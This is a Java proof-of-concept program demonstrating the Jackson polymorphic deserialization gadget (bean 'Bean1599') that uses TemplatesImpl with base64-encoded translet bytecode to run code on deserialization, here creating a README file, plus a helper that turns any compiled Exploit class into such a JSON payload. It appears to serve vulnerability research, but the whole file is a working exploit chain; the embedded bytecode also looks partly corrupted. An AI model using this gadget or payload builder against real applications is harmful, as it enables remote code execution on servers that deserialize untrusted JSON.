package deserialization;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.Base64;
import java.util.Base64.Encoder;
import java.util.HashMap;

import com.fasterxml.jackson.core.JsonParseException;
import com.fasterxml.jackson.databind.JsonMappingException;
import com.fasterxml.jackson.databind.ObjectMapper;

public class Deserialization {
	
	static class Bean1599 {
		public int id;
		public Object obj;
	}
	
	final static String JSON = 
			"{'id': 124,\n" 
			+ " 'obj':[ 'com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl',\n" 
				+ "  {\n"
						+ "    'transletBytecodes' : [ '77+977+977+977+9AAAANAA1AA4AHQkAHgAfCAAgACEAIgcAIwgAJA==AAUAJQ==AAUAJggAJwgAKAgAKQkAACoHACkHACsBAARpbmZvAQASTGphdmEvbGFuZy9TdHJpbmc7AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEARXhjZXB0aW9ucwcALAEACXRyYW5zZm9ybQEA77+9KExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACDxjbGluaXQ+AQA=U291cmNlRmlsZQEADEV4cGxvaXQuamF2YQwAEQASBwAtDAAuAC8BABNFeHBsb2l0IENvbnN0cnVjdG9yBwAwDAAxADIBAAxqYXZhL2lvL0ZpbGUBAB4vaG9tZS9zcGVsZHN6dXMvRGVza3RvcC9SRUFETUUMABEAMgwAMwA0AQASRXhwbG9pdCB0cmFuc2Zvcm0xAQASRXhwbG9pdCB0cmFuc2Zvcm0yAQAHRXhwbG9pdAwADwAQAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvbGFuZy9FeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAA==Y3JlYXRlTmV3RmlsZQEAAygpWgAhAA==AA4AAAABAAkADwAQAAAABAABABEAEgACABMAAAA+AAMAAQAAABoq77+9AAHvv70AAhID77+9AATvv70ABVkSBu+/vQAH77+9AAhX77+9AAAAAQAUAAAAEgAEAAAACAAEAAkADAA=ABkACwAVAAAABAABABYAAQAXABgAAQATAAAAJQACAAQAAAAJ77+9AAISCe+/vQAE77+9AAAAAQAUAAAAAAIAAAARAAgAEgABABcAGQABABMAAAAlAAIAAwAAAAnvv70AAhI=77+9AATvv70AAAABABQAAAA=AAIAAAAXAAgAGAAIABoAEgABABMAAAAeAAEAAAAAAAYSC++/vQAM77+9AAAAAQAUAAAABgABAAAABgABABsAAAACABw=' ],\n"  
						+ "    'transletName' : 'a.b',\n"
						+ "    'outputProperties' : {  }\n" 
					+ "  }\n" 
				+ " ]\n" 
			+ "}";
	
	public static void main(String[] args) throws Exception {
		
		
//		Class<?> clazz = new URLClassLoader(new URL[] {new File("exploit/").toURI().toURL()}).loadClass("Exploit");
//		Object inst = clazz.newInstance();
		
		File output = new File("/home/speldszus/Desktop/README");
//		if(output.exists()) {
//			output.delete();
//		}
//		else {
//			throw new RuntimeException("README hasn't been created by classloader");
//		}
		
//		String json = buildJSON();
		
		ObjectMapper mapper = new ObjectMapper();
		mapper.enableDefaultTyping();
		
//		Bean1599 in = new Bean1599();
//		in.id = 4;
//		in.obj = inst;
//		
//		String file = mapper.writeValueAsString(in);
		
		try {
			Bean1599 object = mapper.readValue(JSON.replace('\'', '"'), Bean1599.class);

//			Bean1599 object = mapper.readValue(json.replace('\'', '"'), Bean1599.class);
			System.out.println("Allocated Object: "+object);
			System.out.println("ID: "+object.id);
			System.out.println("Payload: "+object.obj);
			
			System.out.println(((com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet) object.obj));
			
		} catch (JsonParseException e) {
			e.printStackTrace();
		} catch (JsonMappingException e) {
			e.printStackTrace();
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
		
		if(output.exists()) {
			output.delete();
		}
		else {
			throw new RuntimeException("README hasn't been created by JACKSON");
		}
	}
	
	public static String buildJSON() {
		try(BufferedReader in = new BufferedReader(new FileReader("exploit/Exploit.class"));
				FileOutputStream out = new FileOutputStream("exploit/Exploit.json")){
			String begin = "{'id': 124,\n" + 
					" 'obj':[ 'com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl',\n" + 
					"  {\n" + 
					"    'transletBytecodes' : [ '";
			StringBuilder builder = new StringBuilder(begin);
			out.write(begin.getBytes());
			
			
			Encoder encoder = Base64.getEncoder();
			String line;
			while((line = in.readLine()) != null) {
				byte[] base64 = encoder.encode(line.getBytes());
				out.write(base64);
				builder.append(base64);
			}
			String end = "' ],\n" + 
					"    'transletName' : 'Exploit'\n" + 
					"  }\n" + 
					" ]\n" + 
					"}";
			out.write(end.getBytes());
			builder.append(end);
			return builder.toString();
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return null;
	}
}
